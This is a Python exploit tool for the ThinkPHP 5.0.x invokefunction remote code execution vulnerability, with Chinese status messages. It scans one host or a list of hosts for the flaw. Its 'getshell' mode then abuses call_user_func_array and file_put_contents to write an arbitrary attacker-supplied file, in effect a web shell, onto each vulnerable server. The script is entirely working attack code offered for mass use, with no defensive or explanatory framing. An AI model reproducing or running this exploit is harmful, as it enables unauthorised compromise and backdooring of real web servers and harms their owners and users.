#-*- coding:utf-8 -*-
import requests,sys,os
host=""
action=""
content=""
filename=""
txt=""
PayloadModel="/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]={filename}&vars[1][]={contents}"
if __name__ == "__main__":
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE'}
    if len(sys.argv) % 2 != 0:
           index=0
           while index< len(sys.argv):
               if (sys.argv[index]) == "--action":
                   action=sys.argv[index+1].strip()
               if (sys.argv[index]) == "--host":
                   host=sys.argv[index+1].strip()
               if (sys.argv[index]) == "--content":
                   content=sys.argv[index+1].strip()
               if (sys.argv[index]) == "--filename":
                   filename=sys.argv[index+1].strip()
               if (sys.argv[index]) == "--txt":
                   txt=sys.argv[index+1].strip()
               index=index+1
    if action=="scan":
        if txt == "":
            req=requests.get(host+"/index.php/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=log&vars[1][]=log",headers=headers)
            req.encoding = "utf-8"
            data=req.text
            if data == '3':
                print("[info]\t"+host+"\t存在getshell")
            else:
                print("[info]\t"+host+"\t暂未探测到该漏洞!")
        else:
            if os.path.exists(txt):
                lines=open(txt,"r")
                for line in lines:
                    host=line.replace('\n', '')
                    req=requests.get(host+"/index.php/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=log&vars[1][]=log",headers=headers)
                    req.encoding = "utf-8"
                    data=req.text
                    if data == '3':
                        print("[info]\t"+host+"\t存在getshell!")
                    else:
                        print("[info]\t"+host+"\t暂未探测到该漏洞!")
            else:
                print("[info]\t"+"指定的"+txt+"文件不存在!")
    elif action=="getshell":
        if txt == "":
            payload=PayloadModel.format(filename=filename,contents=content)
            req=requests.get(host+payload,headers=headers)
            req.encoding = "utf-8"
            data=req.text
            if data == str(len(content)):
                print("[info]\t"+host+"\t写入成功!\t地址:"+host+"/"+filename)
            else:
                print("[info]\t"+host+"\t请先确认存在该漏洞!")
        else:
            if os.path.exists(txt):
                lines=open(txt,"r")
                for line in lines:
                    host=line.replace('\n', '')
                    payload=PayloadModel.format(filename=filename,contents=content)
                    req=requests.get(host+payload,headers=headers)
                    req.encoding = "utf-8"
                    data=req.text
                    if data == str(len(content)):
                        print("[info]\t"+host+"\t写入成功!\t地址:"+host+"/"+filename)
                    else:
                        print("[info]\t"+host+"\t请先确认存在该漏洞!")
            else:
                print("[info]\t"+"指定的"+txt+"文件不存在!") 
    else:
        print("Example:\n\tscan:\n\tpy -3 thinkphp5.0.x-getshell.py --host url --action scan\n\tpy -3 thinkphp5.0.x-getshell.py --txt filename.txt --action scan\n\n\tgetshell:\n\tpy -3 thinkphp5.0.x-getshell.py --host url --action getshell --filename filename --content content\n\tpy -3 thinkphp5.0.x-getshell.py --txt filename.txt --action getshell --filename filename --content content\nThe content parameter requires url encoding")
